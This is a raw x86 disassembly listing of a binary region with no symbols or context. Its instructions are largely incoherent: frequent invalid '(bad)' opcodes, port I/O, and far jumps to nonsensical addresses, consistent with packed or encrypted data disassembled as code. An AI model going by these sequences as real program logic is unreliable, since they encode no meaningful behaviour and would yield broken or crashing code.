  417131:	ficomp DWORD PTR [ebx+0x28]
  417134:	push   ebx
  417135:	mov    esp,0xc74d8242
  41713a:	inc    esp
  41713b:	into   
  41713c:	neg    BYTE PTR [edx+ebp*8-0x16]
  417140:	gs cli 
  417142:	mov    eax,0xd9f465d4
  417147:	inc    ebp
  417148:	adc    BYTE PTR [esi-0x57],ch
  41714b:	arpl   WORD PTR [eax],di
  41714d:	in     eax,dx
  41714e:	xchg   esp,eax
  41714f:	mov    ch,0xf0
  417151:	jp     0x4171a4
  417153:	in     al,0xc0
  417155:	je     0x417117
  417157:	stos   BYTE PTR es:[edi],al
  417158:	mov    ch,0xc8
  41715a:	popa   
  41715b:	int    0xb7
  41715d:	aas    
  41715e:	lahf   
  41715f:	stc    
  417160:	out    0x82,eax
  417162:	lahf   
  417163:	(bad)  
  417164:	sub    eax,0xc76ced95
  417169:	and    BYTE PTR [ebx],dl
  41716b:	gs and eax,0x3bd78b84
  417171:	aas    
  417172:	(bad)  
  417173:	mov    al,ds:0x49c95cc9
  417178:	cmp    bl,al
  41717a:	stos   DWORD PTR es:[edi],eax
  41717b:	fisttp DWORD PTR [ebx]
  41717d:	mov    bh,0x5
  41717f:	inc    ecx
  417180:	pop    esi
  417181:	jo     0x417120
  417183:	push   es
  417184:	lds    esp,FWORD PTR [esi-0x1a]
  417187:	pop    ss
  417188:	jle    0x41710c
  41718a:	or     eax,0x67db0f66
  41718f:	adc    eax,0x9d4cf7fd
  417194:	push   ebp
  417195:	push   esp
  417196:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417197:	xor    al,0xeb
  417199:	add    BYTE PTR [eax-0x10],cl
  41719c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41719d:	add    DWORD PTR [edx-0x64],edx
  4171a0:	lahf   
  4171a1:	test   eax,0x2e0c8362
  4171a6:	dec    edi
  4171a7:	repnz cmp DWORD PTR [ebx+0x1338a4a5],edi
  4171ae:	stc    
  4171af:	in     al,0x70
  4171b1:	xchg   esi,eax
  4171b2:	out    0x1c,al
  4171b4:	fs retf 
  4171b6:	cwde   
  4171b7:	mov    dh,0x54
  4171b9:	dec    ebp
  4171ba:	jbe    0x417152
  4171bc:	dec    ebp
  4171bd:	dec    ecx
  4171be:	cdq    
  4171bf:	dec    ebp
  4171c0:	test   eax,0x6a621588
  4171c5:	retf   0xc454
  4171c8:	iret   
  4171c9:	in     eax,dx
  4171ca:	xchg   ebx,eax
  4171cb:	jp     0x417181
  4171cd:	call   0xd6b058ee
  4171d2:	scas   al,BYTE PTR es:[edi]
  4171d3:	lea    ecx,[ebx-0x3c]
  4171d6:	ins    DWORD PTR es:[edi],dx
  4171d7:	sbb    eax,DWORD PTR [edx]
  4171d9:	in     al,dx
  4171da:	and    al,0x75
  4171dc:	xchg   ebp,edx
  4171de:	push   0xffffff93
  4171e0:	cwde   
  4171e1:	push   0xffffff84
  4171e3:	imul   BYTE PTR [eax]
  4171e5:	aaa    
  4171e6:	(bad)  
  4171e7:	(bad)  
  4171e8:	repnz sti 
  4171ea:	call   0x4ed65083
  4171ef:	lods   al,BYTE PTR ds:[esi]
  4171f0:	cs push 0x261435fa
  4171f6:	inc    ebx
  4171f7:	fsub   DWORD PTR [edx+0x2e]
  4171fa:	test   al,0x39
  4171fc:	sub    ah,ch
  4171fe:	push   esp
  4171ff:	or     al,0x77
  417201:	sbb    cl,BYTE PTR [edx]
  417203:	inc    ebx
  417204:	xchg   ecx,eax
  417205:	scas   al,BYTE PTR es:[edi]
  417206:	int3   
  417207:	sbb    bl,BYTE PTR [edi+0x19]
  41720a:	cmp    ch,BYTE PTR [eax+ebp*1]
  41720d:	dec    edx
  41720e:	gs pop esi
  417210:	xor    al,0xde
  417212:	into   
  417213:	pop    ebp
  417214:	mul    BYTE PTR [ecx]
  417216:	sbb    al,BYTE PTR [ebp+0x65]
  417219:	mov    bl,0x8f
  41721b:	mul    ch
  41721d:	sbb    al,0xc6
  41721f:	inc    esp
  417220:	imul   eax,esp,0xffffffa3
  417223:	mov    bl,0x49
  417225:	push   ecx
  417226:	jmp    0x3b472094
  41722b:	ffree  st(7)
  41722d:	clc    
  41722e:	in     eax,dx
  41722f:	sub    al,0x68
  417231:	and    BYTE PTR ds:0x51cfa6ca,al
  417237:	and    al,0xef
  417239:	retf   0x28e9
  41723c:	in     al,dx
  41723d:	out    0x79,al
  41723f:	jns    0x4172bd
  417241:	push   ecx
  417242:	out    0x37,eax
  417244:	cmc    
  417245:	add    dl,BYTE PTR [ebx]
  417247:	adc    dl,BYTE PTR [edi-0x52]
  41724a:	(bad)  
  41724b:	push   0x1e
  41724d:	mov    ds:0x55ba83e3,al
  417252:	in     eax,0xdc
  417254:	push   ss
  417255:	push   ds
  417256:	jmp    0x6d300b0f
  41725b:	jne    0x417293
  41725d:	outs   dx,BYTE PTR ds:[esi]
  41725e:	push   0xc710c2b4
  417263:	ja     0x417280
  417265:	mov    eax,DWORD PTR [ecx-0x1a4182d7]
  41726b:	or     dl,dh
  41726d:	dec    esi
  41726e:	mov    dh,BYTE PTR [edi]
  417270:	retf   0x8c6e
  417273:	jns    0x417296
  417275:	inc    ecx
  417276:	sub    al,0x55
  417278:	jp     0x417289
  41727a:	pop    esi
  41727b:	push   0xffffffe5
  41727d:	push   es
  41727e:	mov    ds:0x4b5de3af,al
  417283:	repnz xor DWORD PTR [eax-0x6],ebp
  417287:	xchg   esp,eax
  417288:	sahf   
  417289:	push   cs
  41728a:	mov    WORD PTR [ebx-0x19fa6ee4],gs
  417290:	xchg   ecx,eax
  417291:	adc    BYTE PTR [edi-0x33],dl
  417294:	mov    ah,0xdc
  417296:	shl    BYTE PTR [ebp+0x4c],0xe1
  41729a:	fnstenv [ecx-0x6b0f1537]
  4172a0:	cmc    
  4172a1:	clc    
  4172a2:	cmp    dl,BYTE PTR [edi+0x5691edb9]
  4172a8:	imul   edx,DWORD PTR [ecx+0x608fa0b1],0x41de4177
  4172b2:	(bad)  [ebp-0x1c]
  4172b5:	mov    ds:0xc1c01e2b,eax
  4172ba:	sbb    eax,0x3b64b13f
  4172bf:	jmp    0xfd207987
  4172c4:	aas    
  4172c5:	push   edx
  4172c6:	xor    DWORD PTR [eax],ebp
  4172c8:	dec    eax
  4172c9:	outs   dx,DWORD PTR ds:[esi]
  4172ca:	sbb    DWORD PTR [edi+0x78b90a47],edi
  4172d0:	call   0x815bd589
  4172d5:	bound  esp,QWORD PTR [eax]
  4172d7:	hlt    
  4172d8:	aaa    
  4172d9:	stos   BYTE PTR es:[edi],al
  4172da:	mov    bl,0xfb
  4172dc:	test   BYTE PTR [esi],dh
  4172de:	pushf  
  4172df:	hlt    
  4172e0:	sahf   
  4172e1:	clc    
  4172e2:	and    edi,0xffffffff
  4172e5:	retf   0xd0df
  4172e8:	inc    edi
  4172e9:	out    0xbe,eax
  4172eb:	xor    eax,0x5532fafd
  4172f0:	sub    al,0x5d
  4172f2:	pusha  
  4172f3:	stos   DWORD PTR es:[edi],eax
  4172f4:	jne    0x41730e
  4172f6:	mul    ebp
  4172f8:	xchg   esp,eax
  4172f9:	leave  
  4172fa:	pop    ss
  4172fb:	dec    esi
  4172fc:	mov    bl,bh
  4172fe:	sub    al,0x88
  417300:	xor    DWORD PTR [edi+0x74],edi
  417303:	add    DWORD PTR [edx],0xffffff86
  417306:	pusha  
  417307:	mov    bl,0x29
  417309:	arpl   WORD PTR [eax-0x27],dx
  41730c:	jl     0x41736a
  41730e:	sub    al,0x51
  417310:	(bad)  
  417311:	dec    ebp
  417312:	jns    0x4172dd
  417314:	mov    WORD PTR [ecx],cs
  417316:	bound  edx,QWORD PTR [edx-0x57d3cae2]
  41731c:	inc    ecx
  41731d:	jns    0x4172e6
  41731f:	and    edi,DWORD PTR [eax+0x4bc139ac]
  417325:	loope  0x417334
  417327:	outs   dx,DWORD PTR ds:[esi]
  417328:	arpl   WORD PTR [esi-0x74966a9d],bx
  41732e:	lea    ecx,[edx+0x7b]
  417331:	fisub  DWORD PTR [esp+ebx*1-0xb82424d]
  417338:	stos   DWORD PTR es:[edi],eax
  417339:	lods   al,BYTE PTR ds:[esi]
  41733a:	jae    0x41730d
  41733c:	mov    eax,ds:0xaeadf85f
  417341:	sub    eax,0x574236ce
  417346:	push   esp
  417347:	outs   dx,BYTE PTR ds:[esi]
  417348:	neg    DWORD PTR [esi-0x493fb44]
  41734e:	push   0xffffffa3
  417350:	jo     0x417352
  417352:	jmp    0xbb4a:0xf4432eb4
  417359:	push   ds
  41735a:	or     esp,DWORD PTR [edx+0x7a]
  41735d:	js     0x417339
  41735f:	and    al,BYTE PTR [ebx]
  417361:	inc    esp
  417362:	xchg   ebx,eax
  417363:	inc    edx
  417364:	mov    al,ds:0xff2ac966
  417369:	cmp    BYTE PTR [ebp-0x75c29507],dh
  41736f:	cld    
  417370:	not    BYTE PTR [ebx-0x9f117f1]
  417376:	add    bh,bh
  417378:	cmp    edi,DWORD PTR [esi+0x6f]
  41737b:	pop    DWORD PTR [ebx+esi*8-0x2]
  41737f:	stos   BYTE PTR es:[edi],al
  417380:	fnstenv [edi+0x1972420a]
  417386:	outs   dx,BYTE PTR ds:[esi]
  417387:	push   esp
  417388:	sbb    eax,DWORD PTR [esp+edi*2-0x6428ef94]
  41738f:	ja     0x417372
  417391:	scas   al,BYTE PTR es:[edi]
  417392:	jb     0x417331
  417394:	gs mov al,0x86
  417397:	add    al,0xf6
  417399:	jbe    0x41738b
  41739b:	mov    ds:0xdf7ff22b,eax
  4173a0:	out    dx,al
  4173a1:	inc    edi
  4173a2:	jge    0x417325
  4173a4:	loop   0x41733e
  4173a6:	scas   eax,DWORD PTR es:[edi]
  4173a7:	inc    ebx
  4173a8:	jle    0x4173f0
  4173aa:	cmp    ebx,edx
  4173ac:	dec    eax
  4173ad:	(bad)  
  4173ae:	jne    0x4173e0
  4173b0:	sub    DWORD PTR [ecx],esi
  4173b2:	mov    dh,0x3d
  4173b4:	clc    
  4173b5:	jno    0x4173ee
  4173b7:	ins    DWORD PTR es:[edi],dx
  4173b8:	jmp    0x3111:0x7f933785
  4173bf:	pop    eax
  4173c0:	jle    0x4173d8
  4173c2:	retf   0x2bc1
  4173c5:	call   0x23bd65fd
  4173ca:	pop    ds
  4173cb:	sub    dh,ch
  4173cd:	aaa    
  4173ce:	dec    esp
  4173cf:	cmp    al,cl
  4173d1:	loope  0x41736a
  4173d3:	inc    ecx
  4173d4:	sub    BYTE PTR [edi+ebx*8-0x2473509b],cl
  4173db:	aad    0xad
  4173dd:	inc    ebp
  4173de:	pop    ss
  4173df:	pop    ds
  4173e0:	sbb    al,0xd6
  4173e2:	inc    eax
  4173e3:	mov    esp,0x3b2d24f5
  4173e8:	call   0xe297371b
  4173ed:	add    ch,BYTE PTR ds:0xba9af1b
  4173f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173f4:	inc    edi
  4173f5:	retf   
  4173f6:	div    BYTE PTR [ebp-0x56]
  4173f9:	inc    eax
  4173fa:	sub    BYTE PTR [ebx+0x4f],dl
  4173fd:	or     ecx,DWORD PTR [ebp+edi*1-0x7acf6fc0]
  417404:	xchg   BYTE PTR [edx-0x12],cl
  417407:	in     al,0xf4
  417409:	arpl   bp,dx
  41740b:	popf   
  41740c:	push   cs
  41740d:	les    ebp,FWORD PTR [esi+0x59a6b6a8]
  417413:	and    DWORD PTR [edx],eax
  417415:	out    0x2b,ax
  417418:	scas   eax,DWORD PTR es:[edi]
  417419:	jmp    0xaae0:0x6ba74979
  417420:	inc    ecx
  417421:	add    al,0xa0
  417423:	pop    ecx
  417424:	fnstsw WORD PTR ds:0x7cda4ea2
  41742a:	mov    edx,0xc6cabc10
  41742f:	jl     0x41742b
  417431:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417432:	push   cs
  417433:	iret   
  417434:	xor    edi,DWORD PTR [ebx]
  417436:	mov    bl,0xc
  417438:	mov    al,ds:0x9cc7d795
  41743d:	xchg   edi,eax
  41743e:	mov    esp,0x4d735850
  417443:	and    eax,DWORD PTR [esi]
  417445:	and    DWORD PTR [ebx],ebp
  417447:	and    bh,ah
  417449:	das    
  41744a:	adc    BYTE PTR ds:0xf0e489f8,dl
  417450:	(bad)  
  417451:	lds    eax,FWORD PTR [ebx]
  417453:	outs   dx,DWORD PTR ds:[esi]
  417454:	sbb    BYTE PTR [edi+0x56],0x5e
  417458:	xor    ah,0xe9
  41745b:	scas   al,BYTE PTR es:[edi]
  41745c:	pop    edi
  41745d:	mov    ebx,0x6228fd04
  417462:	cwde   
  417463:	pop    ecx
  417464:	xchg   edi,eax
  417465:	adc    bh,dh
  417467:	arpl   WORD PTR [edx+ecx*1-0x74],bx
  41746b:	in     eax,0xcb
  41746d:	idiv   DWORD PTR [ebx]
  41746f:	frstor [ebp+0x21d57fc0]
  417475:	pop    es
  417476:	and    dl,BYTE PTR [ebx+0x709d7744]
  41747c:	sbb    DWORD PTR [edx+0x48e56777],edi
  417482:	cmp    dh,BYTE PTR [edx-0x4f]
  417485:	sub    al,0x1c
  417487:	sbb    edx,ebx
  417489:	fcomip st,st(6)
  41748b:	mov    ebp,0xf584c7f3
  417490:	out    dx,eax
  417491:	stc    
  417492:	mov    ds:0x17bc3b98,al
  417497:	dec    ecx
  417498:	ds xor eax,0x4b5ff35f
  41749e:	sbb    BYTE PTR [edi+0x20],al
  4174a1:	jecxz  0x41743b
  4174a3:	and    esp,DWORD PTR [esp+edi*2]
  4174a6:	push   eax
  4174a7:	xchg   ebx,eax
  4174a8:	clc    
  4174a9:	mov    ah,BYTE PTR [esi-0x3332936d]
  4174af:	fsubr  QWORD PTR [edx-0x755580d9]
  4174b5:	mov    eax,0x984615b6
  4174ba:	push   eax
  4174bb:	shl    DWORD PTR [ebp+0x12],1
  4174be:	jb     0x417442
  4174c0:	jp     0x41752c
  4174c2:	in     eax,0xe4
  4174c4:	add    al,0x29
  4174c6:	inc    ebx
  4174c7:	cs mov esp,0x1e49900e
  4174cd:	jo     0x4174c6
  4174cf:	loopne 0x4174fb
  4174d1:	and    DWORD PTR [ecx+0x5eb711c8],0xffffffee
  4174d8:	cli    
  4174d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174da:	fisttp QWORD PTR [ecx-0x5698e7bb]
  4174e0:	or     esp,DWORD PTR [edx+eax*2+0x76]
  4174e4:	and    al,0xc1
  4174e6:	xchg   ebp,eax
  4174e7:	test   al,0x3
  4174e9:	loopne 0x417534
  4174eb:	xchg   ecx,eax
  4174ec:	out    dx,eax
  4174ed:	jb     0x417537
  4174ef:	xchg   esp,eax
  4174f0:	sub    esp,DWORD PTR [eax-0x46ddc823]
  4174f6:	xlat   BYTE PTR ds:[ebx]
  4174f7:	cmp    ah,BYTE PTR [edx+0x44]
  4174fa:	push   ds
  4174fb:	out    0x16,al
  4174fd:	(bad)  
  4174fe:	sbb    dh,BYTE PTR [ebp-0x640f0f4e]
  417504:	imul   ebp,DWORD PTR [edx],0xffffffc0
  417507:	and    eax,0x48ef70d6
  41750c:	or     BYTE PTR [esi+0x1d576b0e],0xca
  417513:	(bad)  
  417514:	(bad)  
  417516:	dec    ebp
  417517:	fsub   DWORD PTR [ebp+0x4a]
  41751a:	fnstsw WORD PTR [edx-0x8]
  41751d:	sbb    ecx,DWORD PTR [ecx]
  41751f:	adc    al,0xda
  417521:	mov    WORD PTR [eax-0x388c4cd5],cs
  417527:	mov    di,0x8ba5
  41752b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41752c:	and    al,0xe8
  41752e:	loope  0x417536
  417530:	xchg   edi,eax
  417531:	fstp   QWORD PTR [esi+0x61]
  417534:	push   es
  417535:	xchg   BYTE PTR [edx+0x71],dh
  417538:	xchg   ebx,eax
  417539:	ret    
  41753a:	inc    esp
  41753b:	add    dl,BYTE PTR [edx-0x1a]
  41753e:	jp     0x41759c
  417540:	stos   DWORD PTR es:[edi],eax
  417541:	dec    edx
  417542:	gs icebp 
  417544:	xor    al,0x3a
  417546:	jo     0x41750e
  417548:	sbb    esp,DWORD PTR [edx]
  41754a:	fldenv [esi+ecx*2-0x7d48e3b9]
  417551:	loopne 0x417564
  417553:	dec    esi
  417554:	je     0x417592
  417556:	adc    al,0x88
  417558:	sub    edi,ecx
  41755a:	jo     0x417517
  41755c:	jo     0x417576
  41755e:	mov    ah,0x5d
  417560:	fdivr  DWORD PTR ds:0x7e2617e3
  417566:	dec    eax
  417567:	mov    bh,0x78
  417569:	jns    0x41753b
  41756b:	add    ch,bh
  41756d:	fmul   QWORD PTR [edx]
  41756f:	jle    0x417508
  417571:	mov    eax,ebp
  417573:	dec    esi
  417574:	dec    ebx
  417575:	push   ebx
  417576:	xor    BYTE PTR [eax],bh
  417578:	sbb    esp,DWORD PTR [esp+edi*2+0x7f]
  41757c:	push   edi
  41757d:	fcom   DWORD PTR [esi]
  41757f:	shl    ah,1
  417581:	and    bl,BYTE PTR [ebx-0x63]
  417584:	in     al,0x95
  417586:	push   es
  417587:	retf   0x84e0
  41758a:	jp     0x4175b6
  41758c:	mov    esi,0x8e22a960
  417591:	lods   al,BYTE PTR ds:[esi]
  417592:	imul   BYTE PTR [ecx+ecx*8]
  417595:	pop    esi
  417596:	hlt    
  417597:	test   BYTE PTR [ecx-0x6e63d133],ah
  41759d:	bound  ebx,QWORD PTR [di-0x7b8d]
  4175a2:	or     eax,0xd59f7e64
  4175a7:	mov    edx,0x2248f121
  4175ac:	push   esp
  4175ad:	add    eax,0xc166ac14
  4175b2:	pop    esi
  4175b3:	mov    DWORD PTR [ecx+0x63fb49eb],0x66e93906
  4175bd:	pop    eax
  4175be:	or     eax,0xf5b21887
  4175c3:	and    BYTE PTR [esi-0x7a],cl
  4175c6:	xor    dl,bl
  4175c8:	sub    DWORD PTR [edi+0x536d1fe3],esi
  4175ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175cf:	int    0x36
  4175d1:	pop    ecx
  4175d2:	outs   dx,DWORD PTR ds:[esi]
  4175d3:	xchg   esi,eax
  4175d4:	fdiv   QWORD PTR [esi-0x7fc475a8]
  4175da:	add    al,0x78
  4175dc:	and    DWORD PTR [esi-0x77],edx
  4175df:	fisubr WORD PTR [ebp+0xf5c5ba3]
  4175e5:	sub    DWORD PTR [esi],edx
  4175e7:	or     edx,DWORD PTR [esi+0x807f54a]
  4175ed:	add    eax,DWORD PTR [ecx-0x65c83a43]
  4175f3:	push   0x175e7a7d
  4175f8:	mov    eax,0x22811356
  4175fd:	out    dx,eax
  4175fe:	add    al,0xf4
  417600:	into   
  417601:	dec    ebp
  417602:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417603:	lahf   
  417604:	xlat   BYTE PTR ds:[ebx]
  417605:	aas    
  417606:	xchg   esp,eax
  417607:	mov    bl,0x6d
  417609:	cld    
  41760a:	mov    cl,0x8c
  41760c:	out    dx,eax
  41760d:	in     al,dx
  41760e:	push   ebp
  41760f:	cmp    eax,0x9ddeacfa
  417614:	lahf   
  417615:	fcomi  st,st(3)
  417617:	mov    ecx,0x475fc575
  41761c:	(bad)  
  41761d:	lods   al,BYTE PTR ds:[esi]
  41761e:	dec    ebp
  41761f:	inc    esp
  417620:	xlat   BYTE PTR ds:[ebx]
  417621:	std    
  417622:	repnz push esi
  417624:	ja     0x417607
  417626:	mov    bh,0xf9
  417628:	sbb    BYTE PTR [edx-0x55],ah
  41762b:	(bad)  
  41762c:	jb     0x41760e
  41762e:	push   0xf962f25d
  417633:	mov    dl,0x1a
  417635:	xchg   ebp,eax
  417636:	and    cl,BYTE PTR [ebx+0x1c788770]
  41763c:	and    BYTE PTR [edi+edi*4+0x16],cl
  417640:	mov    ch,BYTE PTR [ecx]
  417642:	stos   DWORD PTR es:[edi],eax
  417643:	sbb    bh,BYTE PTR [edi-0x63]
  417646:	sbb    ecx,DWORD PTR ds:0x422ca38e
  41764c:	fdiv   DWORD PTR [esi-0x3f647f2]
  417652:	pop    ss
  417653:	jge    0x41762e
  417655:	xchg   esi,eax
  417656:	sbb    eax,DWORD PTR [ebp+0x60750fe4]
  41765c:	popf   
  41765d:	xor    cl,BYTE PTR [eax+0x5f]
  417660:	push   ss
  417661:	lock loope 0x417698
  417664:	lock adc ebp,ecx
  417667:	imul   esi,DWORD PTR [esi-0x41],0xca681787
  41766e:	inc    ebp
  41766f:	in     eax,0x8b
  417671:	fprem  
  417673:	or     esi,eax
  417675:	jnp    0x417631
  417677:	pop    edx
  417678:	outs   dx,BYTE PTR ds:[esi]
  417679:	xchg   edx,eax
  41767a:	test   BYTE PTR [edi],0x46
  41767d:	(bad)  
  41767e:	es pop ebx
  417680:	push   ebx
  417681:	je     0x4176f4
  417683:	aam    0x2f
  417685:	test   BYTE PTR [ecx+0x54],dl
  417688:	in     al,0x18
  41768a:	xor    BYTE PTR [edx+0x5400385f],0xaa
  417691:	cmp    al,0xad
  417693:	add    eax,0x977328b
  417698:	adc    ebx,DWORD PTR [esi+0xa]
  41769b:	cs call 0x9026:0x6416
  4176a2:	fstp   TBYTE PTR [ebp+0x1c]
  4176a5:	push   esp
  4176a6:	hlt    
  4176a7:	fs cmc 
  4176a9:	adc    BYTE PTR [eax+0x4d],dl
  4176ac:	push   eax
  4176ad:	or     bh,BYTE PTR [ecx*2+0x380d424b]
  4176b4:	aas    
  4176b5:	mov    esi,0x7e0f3fd7
  4176ba:	jl     0x41766e
  4176bc:	ror    bh,0x83
  4176bf:	or     BYTE PTR [ebx],bl
  4176c1:	shl    DWORD PTR [edx+0x33108efc],1
  4176c7:	into   
  4176c8:	mov    dl,0x77
  4176ca:	jge    0x417653
  4176cc:	cmp    esp,DWORD PTR [ebp-0x619fb700]
  4176d2:	dec    edx
  4176d3:	and    DWORD PTR [edi],eax
  4176d5:	in     al,dx
  4176d6:	jae    0x4176ba
  4176d8:	shl    bl,0x68
  4176db:	mov    ds:0xee8e69b5,eax
  4176e0:	mov    ?,WORD PTR [esi-0x769dd214]
  4176e6:	stos   BYTE PTR es:[edi],al
  4176e7:	ja     0x4176ce
  4176e9:	loope  0x417702
  4176eb:	je     0x417738
  4176ed:	mov    ah,BYTE PTR [edx+0x6df47be8]
  4176f3:	mov    WORD PTR ds:0xae4fd70b,ss
  4176f9:	ins    BYTE PTR es:[edi],dx
  4176fa:	push   ss
  4176fb:	pop    es
  4176fc:	inc    ecx
  4176fd:	jecxz  0x417770
  4176ff:	shr    bh,cl
  417701:	sub    edi,eax
  417703:	inc    edx
  417704:	fidivr DWORD PTR [eax-0x74fe60f2]
  41770a:	push   edx
  41770b:	aam    0x82
  41770d:	and    BYTE PTR [edx+ecx*1+0x3c],al
  417711:	cmp    BYTE PTR [ecx-0x3059c529],bh
  417717:	retf   0xabbb
  41771a:	popf   
  41771b:	mov    esp,0x66b85582
  417720:	xchg   esp,eax
  417721:	fwait
  417722:	dec    esi
  417723:	shl    BYTE PTR [ebx+eax*4],0xb0
  417727:	into   
  417728:	pop    esi
  417729:	je     0x41773a
  41772b:	jge    0x4176ff
  41772d:	int    0x49
  41772f:	gs xchg edx,eax
  417731:	push   cs
  417732:	xor    bh,ch
  417734:	adc    ebx,0xffffffd2
  417737:	mov    ah,0xb1
  417739:	sub    al,0x54
  41773b:	push   eax
  41773c:	lahf   
  41773d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41773e:	leave  
  41773f:	mov    al,ds:0x54bfcc72
  417744:	sbb    dh,ch
  417746:	fisub  WORD PTR ds:0x4ee36ee6
  41774c:	int3   
  41774d:	add    ebx,DWORD PTR [ebx-0x7161712a]
  417753:	pop    esp
  417754:	fwait
  417755:	enter  0x5c73,0xa5
  417759:	leave  
  41775a:	jae    0x41772c
  41775c:	pop    ebx
  41775d:	out    dx,al
  41775e:	mov    BYTE PTR [ebp+0x37],0xae
  417762:	pop    esp
  417763:	sub    eax,0x8649bfed
  417768:	mov    ch,0x9c
  41776a:	inc    esp
  41776b:	rol    BYTE PTR [esi-0x40],cl
  41776e:	mov    al,ds:0x6a5658aa
  417773:	mov    ds:0x8eee9201,al
  417778:	sub    DWORD PTR [ebp+0x68],eax
  41777b:	lock jg 0x4176ff
  41777e:	iret   
  41777f:	adc    eax,0xed53e0a7
  417784:	pop    edi
  417785:	adc    ch,BYTE PTR [ebx-0x10]
  417788:	inc    esi
  417789:	xchg   eax,ebx
  41778b:	xchg   BYTE PTR [ecx-0x2b],dh
  41778e:	jae    0x4177f6
  417790:	or     eax,0x9989ca8a
  417795:	sub    al,0xcb
  417797:	aaa    
  417798:	fs arpl dx,ax
  41779b:	clc    
  41779c:	mov    dl,0x9d
  41779e:	aaa    
  41779f:	mov    al,0x3b
  4177a1:	retf   0xef28
  4177a4:	jb     0x417796
  4177a6:	sub    al,0xc9
  4177a8:	fisubr WORD PTR [ecx]
  4177aa:	addr16 sbb al,0xb6
  4177ad:	popa   
  4177ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177af:	sub    al,0x47
  4177b1:	inc    ecx
  4177b2:	ret    0x987b
  4177b5:	add    eax,ecx
  4177b7:	xchg   ebp,eax
  4177b8:	int3   
  4177b9:	mul    esi
  4177bb:	inc    ecx
  4177bc:	sbb    BYTE PTR [ecx],al
  4177be:	in     eax,0xba
  4177c0:	sub    al,0xc1
  4177c2:	jl     0x417825
  4177c4:	or     ebx,ebx
  4177c6:	lock test BYTE PTR [esi-0x27],ah
  4177ca:	dec    esi
  4177cb:	jl     0x41775a
  4177cd:	inc    ecx
  4177cf:	fdiv   DWORD PTR [edx]
  4177d1:	cmp    ecx,edx
  4177d3:	xchg   ebx,eax
  4177d4:	lds    esp,FWORD PTR [ebx-0x6b5adae8]
  4177da:	js     0x417795
  4177dc:	inc    eax
  4177dd:	ret    0xc17d
  4177e0:	jo     0x41780b
  4177e2:	xchg   edx,eax
  4177e3:	test   BYTE PTR [ebp-0x167d74f9],0x69
  4177ea:	scas   al,BYTE PTR es:[edi]
  4177eb:	fnsetpm(287 only) 
  4177ed:	mov    esi,0x8e9642bf
  4177f2:	xchg   edx,eax
  4177f3:	cmp    eax,0xf0936fbd
  4177f8:	in     al,dx
  4177f9:	aas    
  4177fa:	lock add ebp,DWORD PTR [esi+0x6d61da15]
  417801:	push   edi
  417802:	leave  
  417803:	cmc    
  417804:	mov    esi,0x77c4a22d
  417809:	leave  
  41780a:	mov    esp,0xf737cc24
  41780f:	push   es
  417810:	imul   eax,DWORD PTR [edx],0x6f89e9fc
  417816:	adc    ch,BYTE PTR [esi]
  417818:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417819:	out    dx,eax
  41781a:	or     al,0x8f
  41781c:	jnp    0x4177ef
  41781e:	or     eax,0x844c6683
  417823:	xchg   esp,eax
  417824:	daa    
  417825:	dec    eax
  417826:	xor    al,0x5b
  417828:	dec    edx
  417829:	dec    edi
  41782a:	jecxz  0x417827
  41782c:	mov    al,0x97
  41782e:	pop    esi
  41782f:	push   ebx
  417830:	inc    esp
  417831:	mov    dl,0xb3
  417833:	and    ecx,DWORD PTR [edx-0x5e237c2]
  417839:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41783a:	outs   dx,DWORD PTR ds:[esi]
  41783b:	xchg   ebp,eax
  41783c:	dec    edi
  41783d:	mov    ds:0xddff7bcf,al
  417842:	call   0xdcc607c6
  417847:	adc    al,bh
  417849:	xor    BYTE PTR [eax-0x4],dh
  41784c:	imul   BYTE PTR [edx-0x42cc4dda]
  417852:	xchg   esi,eax
  417853:	aad    0xc5
  417855:	cmp    bh,0x52
  417858:	dec    eax
  417859:	and    edx,DWORD PTR [edx+eiz*1-0x5]
  41785d:	icebp  
  41785e:	or     cl,BYTE PTR [ecx]
  417860:	arpl   WORD PTR [edx+esi*8-0x2f],bp
  417864:	sahf   
  417865:	inc    BYTE PTR [edx]
  417867:	adc    al,0x46
  417869:	or     al,0x68
  41786b:	xchg   ebx,eax
  41786c:	push   ecx
  41786d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41786e:	mov    al,ds:0xf3b10fbf
  417873:	jne    0x4178e0
  417875:	inc    ebp
  417876:	into   
  417877:	shl    BYTE PTR fs:[eax+ecx*2],1
  41787b:	mov    DWORD PTR [edx],ecx
  41787d:	inc    edx
  41787e:	dec    esp
  41787f:	test   dh,dl
  417881:	xlat   BYTE PTR ds:[ebx]
  417882:	xor    esp,DWORD PTR [esi-0x2f189c6a]
  417888:	mov    ebp,0x98617ac6
  41788d:	int    0xe8
  41788f:	data16 aas 
  417891:	cmp    al,0x82
  417893:	ds cmc 
  417895:	adc    al,0xa5
  417897:	repnz add eax,DWORD PTR [edx+0x63322f15]
  41789e:	sub    ecx,edx
  4178a0:	pop    edi
  4178a1:	sub    ebp,ebx
  4178a3:	fbld   TBYTE PTR [esi+0x7d]
  4178a6:	sbb    eax,DWORD PTR [edx]
  4178a8:	scas   eax,DWORD PTR es:[edi]
  4178a9:	xchg   edi,eax
  4178aa:	mov    cl,0x95
  4178ac:	mov    dl,0xc7
  4178ae:	xchg   esp,eax
  4178af:	cmp    ebp,ecx
  4178b1:	aas    
  4178b2:	sbb    ecx,ecx
  4178b4:	lods   al,BYTE PTR ds:[esi]
  4178b5:	loop   0x41784a
  4178b7:	jp     0x417918
  4178b9:	loope  0x4178fe
  4178bb:	or     dl,dl
  4178bd:	ins    DWORD PTR es:[edi],dx
  4178be:	jmp    0x4178d7
  4178c0:	inc    edx
  4178c1:	in     al,dx
  4178c2:	es pop ecx
  4178c4:	add    eax,DWORD PTR [esi-0x18e02d3b]
  4178ca:	leave  
  4178cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178cc:	pop    ebx
